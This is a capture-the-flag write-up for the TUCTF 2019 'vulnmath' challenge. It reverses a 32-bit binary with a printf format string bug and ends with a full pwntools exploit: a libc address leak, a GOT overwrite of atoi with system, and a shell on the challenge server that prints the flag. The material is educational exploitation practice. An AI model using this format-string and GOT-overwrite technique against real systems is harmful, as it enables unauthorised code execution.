# Vulnmath tuctf 2019

Let's take a look at the binary:

```
$    pwn checksec vulnmath
[*] '/home/guyinatuxedo/Desktop/tuctf/vulnmath'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
$    file vulnmath
vulnmath: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=ba48ed39bdaaa3ddfc1bab6e8f45c8ee92e552bc, for GNU/Linux 3.2.0, not stripped
$    ./libc.so.6
GNU C Library (Ubuntu GLIBC 2.30-0ubuntu2) stable release version 2.30.
Copyright (C) 2019 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.
There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A
PARTICULAR PURPOSE.
Compiled by GNU CC version 9.2.1 20190909.
libc ABIs: UNIQUE IFUNC ABSOLUTE
For bug reporting instructions, please see:
<https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs>.
$    ./vulnmath
Welcome to VulnMath
Where your wildest shells can come true

What is 13 * 1?
> %x
Incorrect!
9c27160

What is 12 * 13?
>
```

So we can see we are dealing with a `32` bit binary with libc version `2.30`, that is vulnerable to a format string bug. A format string bug is essentially when `printf` is called on data without a format string specified, so the data itself can specify what format strings to use. I have already made a lot of write ups about this, so I won't go super in depth about everything. If you want to see more about this, checkout `https://github.com/guyinatuxedo/nightmare/tree/master/modules/10-fmt_strings` or just `https://github.com/guyinatuxedo/nightmare/`.

## Reversing

When we take a look at the `main` function in ghidra, we see this:

```
/* WARNING: Function: __x86.get_pc_thunk.bx replaced with injection: get_pc_thunk_bx */

undefined4 main(void)

{
  uint __seed;
  int iVar1;
  undefined4 local_48;
  undefined4 local_44;
  undefined4 local_40;
  undefined4 local_3c;
  undefined4 local_38;
  undefined4 local_34;
  undefined4 local_30;
  undefined4 local_2c;
  int local_28;
  int local_24;
  int local_20;
  undefined4 *local_1c;
  int i;
  int local_14;
 
  setvbuf(stdout,(char *)0x0,2,0x14);
  setvbuf(stdin,(char *)0x0,2,0x14);
  local_14 = 0;
  local_1c = (undefined4 *)malloc(0x40);
  memset(&local_48,0,0x20);
  __seed = time((time_t *)0x0);
  srand(__seed);
  puts("Welcome to VulnMath\nWhere your wildest shells can come true\n");
  i = 0;
  while (i < 6) {
    iVar1 = rand();
    local_20 = iVar1 % 0x13 + 1;
    iVar1 = rand();
    local_24 = iVar1 % 0x13 + 1;
    printf("What is %d * %d?\n> ",local_20,local_24);
    read(0,local_1c,0x20);
    local_48 = *local_1c;
    local_44 = local_1c[1];
    local_40 = local_1c[2];
    local_3c = local_1c[3];
    local_38 = local_1c[4];
    local_34 = local_1c[5];
    local_30 = local_1c[6];
    local_2c = local_1c[7];
    local_28 = atoi((char *)&local_48);
    if (local_28 == local_20 * local_24) {
      puts("Correct! +5 points");
      local_14 = local_14 + 5;
    }
    else {
      puts("Incorrect!");
      printf((char *)&local_48);
    }
    puts("");
    i = i + 1;
  }
  printf("Final Score: %d\n",local_14);
  puts("Thanks for playing!");
  free(local_1c);
  return 0;
}
```

We can see the format string bug here:

```
      printf((char *)&local_48);
```

Since relro is not enabled, we will just go for the got overwrite. Since it looks like there are no good places to jump in the binary that will either give us a shell or print out the flag, I decided to jump to `system` in libc. This meant I needed a libc infoleak.

## Exploitation

We can find out where we can find our input in reference to the format string but with the standard method:

```
gef➤  r
Starting program: /home/guyinatuxedo/Desktop/tuctf/vulnmath
Welcome to VulnMath
Where your wildest shells can come true

What is 17 * 18?
> 0000.%6$x
Incorrect!
0000.30303030

What is 5 * 11?
>
```

```
gef➤  b *0x804948f
Breakpoint 1 at 0x804948f
gef➤  r
Starting program: /home/guyinatuxedo/Desktop/tuctf/vulnmath
Welcome to VulnMath
Where your wildest shells can come true

What is 12 * 3?
> 0000     
Incorrect!

Breakpoint 1, 0x0804948f in main ()
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────── registers ────
$eax   : 0xffffd138  →  "0000"
$ebx   : 0x0804c000  →  0x0804bf0c  →  0x00000001
$ecx   : 0xffffffff
$edx   : 0xffffffff
$esp   : 0xffffd120  →  0xffffd138  →  "0000"
$ebp   : 0xffffd178  →  0x00000000
$esi   : 0xf7fb6000  →  0x001e8d6c
$edi   : 0xf7fb6000  →  0x001e8d6c
$eip   : 0x0804948f  →  <main+441> call 0x8049110 <printf@plt>
$eflags: [zero carry PARITY ADJUST SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063
───────────────────────────────────────────────────────────────────── stack ────
0xffffd120│+0x0000: 0xffffd138  →  "0000"     ← $esp
0xffffd124│+0x0004: 0x0804d1a0  →  "0000"
0xffffd128│+0x0008: 0x00000020
0xffffd12c│+0x000c: 0x080493ba  →  <main+228> mov ecx, eax
0xffffd130│+0x0010: 0xf7fb4a60  →  0xf7fb4a60  →  [loop detected]
0xffffd134│+0x0014: 0x00080000
0xffffd138│+0x0018: "0000"
0xffffd13c│+0x001c: 0x0000000a
─────────────────────────────────────────────────────────────── code:x86:32 ────
    0x8049488 <main+434>       sub    esp, 0xc
    0x804948b <main+437>       lea    eax, [ebp-0x40]
    0x804948e <main+440>       push   eax
 →  0x804948f <main+441>       call   0x8049110 <printf@plt>
   ↳   0x8049110 <printf@plt+0>   endbr32
       0x8049114 <printf@plt+4>   jmp    DWORD PTR ds:0x804c010
       0x804911a <printf@plt+10>  nop    WORD PTR [eax+eax*1+0x0]
       0x8049120 <free@plt+0>     endbr32
       0x8049124 <free@plt+4>     jmp    DWORD PTR ds:0x804c014
       0x804912a <free@plt+10>    nop    WORD PTR [eax+eax*1+0x0]
─────────────────────────────────────────────────────── arguments (guessed) ────
printf@plt (
   [sp + 0x0] = 0xffffd138 → "0000"
)
─────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "vulnmath", stopped, reason: BREAKPOINT
───────────────────────────────────────────────────────────────────── trace ────
[#0] 0x804948f → main()
────────────────────────────────────────────────────────────────────────────────
gef➤  x/40w 0xffffd138
0xffffd138:    0x30303030    0xa    0x0    0x0
0xffffd148:    0x0    0x0    0x0    0x0
0xffffd158:    0x0    0x3    0xc    0x804d1a0
0xffffd168:    0x0    0x0    0xffffd190    0x0
0xffffd178:    0x0    0xf7debfb9    0xf7fb6000    0xf7fb6000
0xffffd188:    0x0    0xf7debfb9    0x1    0xffffd224
0xffffd198:    0xffffd22c    0xffffd1b4    0x1    0x0
0xffffd1a8:    0xf7fb6000    0x0    0xf7ffd000    0x0
0xffffd1b8:    0xf7fb6000    0xf7fb6000    0x0    0x55c5257
0xffffd1c8:    0x47819c47    0x0    0x0    0x0
gef➤  vmmap
Start      End        Offset     Perm Path
0x08048000 0x08049000 0x00000000 r-- /home/guyinatuxedo/Desktop/tuctf/vulnmath
0x08049000 0x0804a000 0x00001000 r-x /home/guyinatuxedo/Desktop/tuctf/vulnmath
0x0804a000 0x0804b000 0x00002000 r-- /home/guyinatuxedo/Desktop/tuctf/vulnmath
0x0804b000 0x0804c000 0x00002000 r-- /home/guyinatuxedo/Desktop/tuctf/vulnmath
0x0804c000 0x0804d000 0x00003000 rw- /home/guyinatuxedo/Desktop/tuctf/vulnmath
0x0804d000 0x0806f000 0x00000000 rw- [heap]
0xf7dcd000 0xf7dea000 0x00000000 r-- /usr/lib/i386-linux-gnu/libc-2.30.so
0xf7dea000 0xf7f44000 0x0001d000 r-x /usr/lib/i386-linux-gnu/libc-2.30.so
0xf7f44000 0xf7fb3000 0x00177000 r-- /usr/lib/i386-linux-gnu/libc-2.30.so
0xf7fb3000 0xf7fb4000 0x001e6000 --- /usr/lib/i386-linux-gnu/libc-2.30.so
0xf7fb4000 0xf7fb6000 0x001e6000 r-- /usr/lib/i386-linux-gnu/libc-2.30.so
0xf7fb6000 0xf7fb8000 0x001e8000 rw- /usr/lib/i386-linux-gnu/libc-2.30.so
0xf7fb8000 0xf7fba000 0x00000000 rw-
0xf7fcd000 0xf7fcf000 0x00000000 rw-
0xf7fcf000 0xf7fd2000 0x00000000 r-- [vvar]
0xf7fd2000 0xf7fd3000 0x00000000 r-x [vdso]
0xf7fd3000 0xf7fd4000 0x00000000 r-- /usr/lib/i386-linux-gnu/ld-2.30.so
0xf7fd4000 0xf7ff1000 0x00001000 r-x /usr/lib/i386-linux-gnu/ld-2.30.so
0xf7ff1000 0xf7ffc000 0x0001e000 r-- /usr/lib/i386-linux-gnu/ld-2.30.so
0xf7ffc000 0xf7ffd000 0x00028000 r-- /usr/lib/i386-linux-gnu/ld-2.30.so
0xf7ffd000 0xf7ffe000 0x00029000 rw- /usr/lib/i386-linux-gnu/ld-2.30.so
0xfffdd000 0xffffe000 0x00000000 rw- [stack]
```

So we can see that `17` spots after our input, is the libc address `0xf7debfb9`, which is `0x1efb9` bytes ahead of the libc base address. This means that at spot `17 + 6 = 23`, we should get a libc infoleak:

```
$    ./vulnmath
Welcome to VulnMath
Where your wildest shells can come true

What is 4 * 7?
> %23$x
Incorrect!
f7ddafb9

What is 17 * 4?
```

With that, we know the address space of the libc. Proceeding that, we can just write the libc address of `system` (offset of `0x458b0` from the start of libc) over to got address of `atoi`. Now `system` takes a single argument, which is a char pointer. In the context of this code `atoi` is called once which it's argument is a pointer to our input:

```
    local_28 = atoi((char *)&local_48);
```

This is perfect, since it will allow us to call `system("/bin/sh")`, and it won't crash the program before then. After that, we just construct the format string for the got write, which is pretty similar to the ones that are in the writeups linked above. The only real difference is since we are writing a libc address which changes every time we run the binary, we have to calculate the libc `system` address then use that to figure out exactly what value we will write.

## Exploit

Here is the code for our exploit:


```
from pwn import *

target = remote("chal.tuctf.com", 30502)

#target = process("./vulnmath", env={"LD_PRELOAD":"./libc.so.6"})
#gdb.attach(target, gdbscript = 'b *0x8049447')
libc = ELF("./libc.so.6")


# Leak the libc address, calculate libc base and system address
leakPayload = "%23$x"

target.sendline(leakPayload)

print target.recvuntil("> Incorrect!\n")

leak = target.recvline()

leak = int("0x" + leak, 16)

libcBase = leak - 0x1efb9
system = libcBase + libc.symbols["system"]

print "libc base is: " + hex(libcBase)
print "system is: " + hex(system)


# Calculate values we will write for got overwrite
firstWrite = (system & 0xffff) - 0x8
secondWrite = ((system & 0xffff0000) >> 16) - firstWrite - 8

# Make the payload for the got address of atoi
fmtString = p32(0x804c038) + p32(0x804c03a) + '%' + str(firstWrite)+ 'x'  + '%6$n' + '%' + str(secondWrite) + 'x%7$n'

# Send the format string, execute the got overwrite
target.sendline(fmtString)

# Send /bin/sh for argument to system
target.sendline('/bin/sh\x00')

# Get shell
target.interactive()
```

When we run it:

```
$    python exploit.py
[+] Opening connection to chal.tuctf.com on port 30502: Done
[*] '/home/guyinatuxedo/Desktop/tuctf/libc.so.6'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
Welcome to VulnMath
Where your wildest shells can come true

What is 19 * 9?
> Incorrect!

libc base is: 0xf7d67000
system is: 0xf7dac8b0
[*] Switching to interactive mode

What is 17 * 3?
> Incorrect!
8:                 

.    .    .

What is 6 * 18?
> $ w
 06:07:41 up  7:50,  0 users,  load average: 0.09, 0.20, 0.28
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
$ ls
flag.txt
vulnmath
$ cat flag.txt
TUCTF{I_w45_w4rn3d_4b0u7_pr1n7f..._bu7_I_d1dn'7_l1573n}
```

Just like that we got the flag!